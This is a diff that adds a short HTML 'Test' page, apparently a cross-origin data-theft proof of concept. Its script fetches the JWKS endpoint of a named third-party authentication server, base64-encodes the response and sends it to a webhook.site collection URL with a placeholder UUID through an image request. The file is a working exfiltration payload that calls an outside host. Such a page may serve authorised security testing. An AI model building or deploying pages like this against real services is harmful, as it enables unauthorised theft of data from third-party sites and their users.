@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>Test</title></head>
+<body>
+<script>
+fetch('https://auth.flashcourier.com.br/authorization-server/oauth2/jwks')
+  .then(r => r.text())
+  .then(d => {
+    var img = new Image();
+    img.src = 'https://webhook.site/YOUR-UUID?data=' + btoa(d);
+  });
+</script>
+</body>
+</html>
